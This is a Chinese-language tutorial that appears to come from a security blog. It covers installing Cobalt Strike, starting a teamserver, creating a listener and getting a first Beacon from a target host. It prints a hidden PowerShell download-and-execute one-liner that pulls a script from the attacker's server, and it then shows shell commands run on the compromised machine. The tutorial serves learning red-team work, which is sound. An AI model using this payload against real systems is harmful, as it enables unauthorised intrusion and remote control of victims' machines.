  

**前言**

CS作为红队攻防中的热门工具，是入门红蓝攻防的必学工具之一，在斗哥学习和使用Cobalt Strike
的过程中，发现在网上很难找到较为详细且体系化的文章，因此斗哥本着带你进入攻防的奇妙世界的初衷，决定来写一写这个cs工具的使用教程，于是这个系列的文章就出现了。本篇作为基础篇主要内容是工具的安装和最初级的主机上线使用。  
郑重声明：本系列文章的编写仅为了学习与交流，请勿将其中的技术用于违法途径。

 **Cobalt Strike简介**

Cobalt Strike 是一款GUI的框架式渗透工具，集成了端口转发、服务扫描，自动化溢出，多模式端口监听，win exe木马生成，win
dll木马生成，java木马生成，office宏病毒生成，木马捆绑；钓鱼攻击包括：站点克隆，目标信息获取，java执行，浏览器自动攻击等等。

Cobalt Strike: C/S架构的商业渗透软件，适合多人进行团队协作，可模拟APT做模拟对抗，进行内网渗透。

 **安装Cobalt Strike**

###  **3.1安装Java运行环境**

因为启动Cobalt Strike需要JDK的支持，所以需要安装Java环境。

java环境的安装可以参考： https://www.runoob.com/java/java-environment-setup.html

因为安装kali时，默认会安装java环境。我们可以通过java
-version进行验证。![](https://image.3001.net/images/20210927/1632728848_61517710098a76621f1ef.jpg!small)

 **3.2 部署TeamServer**

在安装Cobalt
Strike时，必须搭建团队服务器(也就是TeamServer服务器)。打开cobaltstrike文件夹，如下图所示：![](https://image.3001.net/images/20210927/1632728889_6151773905140ba697c84.jpg!small)

输入 “ls -l”命令，查看TeamServer 和 Cabalt Strike是否有执行权限。当前的TeamServer具备x的执行权限。

![](https://image.3001.net/images/20210927/1632728916_61517754c2be7f6c9e668.jpg!small)

如果TeamServer 和 Cabalt Strike不具备x执行权限，可以通过如下命令进行添加。``

`chmod +x teamserver cobaltstrike`

``

cobaltstrike 文件夹中有多个文件和文件夹。其功能如下。

●agscript：拓展应用的脚本。

●c2lint：用于检查profile 的错误和异常。

●teamserver：团队服务器程序。

●cobaltstrike 和 cobaltstrike.jar:客户端程序。因为teamserver文件是通过Java来调用CobaltStrike
的，所以直接在命令行环境中输入第一个文件的内容也能启动Cobalt Strike 客户端 (主要是为了方便操作)。

●logs:日志，包括 Web日志、Beacon日志、截图日志、下载日志、键盘记录日志等。

●datas：用于保存当前TeamServer的一些数据。

●update 和 update.jar：用于更新Cobalt Strike。

最后，运行团队服务器。在这里，需要设置当前主机的IP地址和团队服务器的密码。输入如下命令启动teamserver。``

`./teamserver 192.168.0.108 c1ay`

``

![](https://image.3001.net/images/20210927/1632728952_61517778c77060bc0553e.jpg!small)  
  

现在，Cobalt Strike团队服务器准备就绪。接下来，我们就可以启动Cobalt Strike客户端来连接团队服务器了。

 **启动Cobalt Strike**

 **4.1启动cobaltstrike.jar**

在Linux下，可以直接通过./cobaltstrike启动客户端，如下图。![](https://image.3001.net/images/20210927/1632729034_615177caa120b063b438a.jpg!small)

填写团队服务器的IP地址、端口号、用户名、密码。在这里，登录的用户名可以任意输人，但要保证当前该用户名没有被用来登录Cobalt Strike服务器。

在确认信息填写无误后，点击Connect连接服务端，这时候会出现指纹校验对话框，如下图。指纹校验的主要作用是防篡改，且每次创建Cobalt
Strike团队服务器时生成的指纹都不一样。![](https://image.3001.net/images/20210927/1632729062_615177e6306d211552040.jpg!small)

在客户端向服务器成功获取相关信息后，即可打开Cobalt Strike 主页面，Cobalt Strike
主页面主要分为菜单栏、快捷功能区、目标列表区、控制台命令输出区、控制台命令输入区。

菜单栏：集成了Cobalt Strike的所有功能。

快捷功能区：列出常用的功能。

目标列表：根据不同的显示模式，显示已获取权限的主机及目标主机。

控制台命令输出区：输出命令的执行结果。

控制台命令输人区：输入命令。![](https://image.3001.net/images/20210927/1632729093_61517805db8e9f482f7e8.jpg!small)

在Windows中，可以直接打开对应的客户端程序。![](https://image.3001.net/images/20210927/1632729132_6151782cf3f9c3fe16af7.jpg!small)

然后输入teamserver服务器的IP地址和密码进行连接即可。![](https://image.3001.net/images/20210927/1632729181_6151785d53fb33dc11d24.jpg!small)

 **4.2利用Cobalt Strike 获取第一个Beacon**

1、建立Listener

可以通过菜单栏的第一个选项”Cobalt Strike”进人”Listeners”
面板，如下图。![](https://image.3001.net/images/20210927/1632729239_615178973f5bb350b9634.jpg!small)

也可以通过快捷功能区进入”Listeners”
面板，如下图。![](https://image.3001.net/images/20210927/1632729590_615179f64a985f6081b4c.jpg!small)

单击“Add”
按钮，新建一个监听器，输人名称、监听器类型、团队服务器IP地址、监听的端口，然后单击“Save”按钮保存设置，如下图。![](https://image.3001.net/images/20210927/1632729658_61517a3aca36f25b6152d.jpg!small)

2、使用 Web Delivery 执行Payload

单击 “Attacks” 菜单，选择”Web Drive-by”→”Scripted Web
Delivery”选项，如下图。![](https://image.3001.net/images/20210927/1632729694_61517a5e8c95a0f439e3d.jpg!small)

或者通过快捷功能区，打开“Scripted Web
Delivery”窗口，如下图。![](https://image.3001.net/images/20210927/1632729720_61517a78af3c4cbf3c69e.jpg!small)

保持默认配置,选择已经创建的监听器，设置类型为PowerShell,然后单击“Launch”按钮，如下图。![](https://image.3001.net/images/20210927/1632729752_61517a9868ad22032b1d1.jpg!small)

最后，将Cobalt
Strike生成的Payload完整地复制下来，如下图。![](https://image.3001.net/images/20210927/1632729779_61517ab371b495eca49b7.jpg!small)

`powershell.exe -nop -w hidden -c "IEX ((new-object
net.webclient).downloadstring('http://192.168.0.108:80/a'))"`

``

其中url它是个文件路径，就是让目标 （受害者）通过这个地址和端口下载 恶意脚本。

访问这个url，可以看到是一段powershell代码，如下图。![](https://image.3001.net/images/20210927/1632729816_61517ad8a560dcbaa8ccc.jpg!small)

3、在目标机器上执行Payload

执行Payload，Cobalt Strike
会收到一个Beacon，如下图。![](https://image.3001.net/images/20210927/1632729935_61517b4fedc670f057c2d.jpg!small)

执行以后，可以在Cobalt
Strike的日志里面看到一条日志，如下图。![](https://image.3001.net/images/20210927/1632729969_61517b716b454ce702f75.jpg!small)

在Cobalt Strike
的主页面中可以看到一台机器上线（包含外网IP地址，内网IP地址、监听器、用户名、机器名、是否有特权、Beacon进程的PID、心跳时间等信息），如下图:![](https://image.3001.net/images/20210927/1632730008_61517b988740692555c65.jpg!small)

4、与目标主机进行交互操作

单击右键，在弹出的快捷菜单中选中需要操作的Beacon，然后单击”Interact”选项，进入主机交互模式，如下图。![](https://image.3001.net/images/20210927/1632730043_61517bbb87dfb880d84a4.jpg!small)

现在就可以输入一些命令来执行相关操作了。输入”shell
whoami”命令,查看当前用户，在心跳时间后就会执行该命令。在执行命令时，需要在命令前添加”shell”。Beacon的每次回连时间默认为60秒。回连后，执行命令的任务将被下发，并成功回显命令的执行结果，如下图。![](https://image.3001.net/images/20210927/1632730072_61517bd8f26f4ef111f9d.jpg!small)

 **后语**

在本篇文章中斗哥简单介绍了一下Cobalt
Strike这一款工具以及该工具使用环境的搭建。然后通过创建了一个监听器实现了第一台主机的上线。再下一篇文章中，我们将介绍Cobalt
Strike的模块详解，以及具体的使用方法，敬请期待。![](https://image.3001.net/images/20210927/1632730096_61517bf06a8e72b0659b9.jpg!small)

  

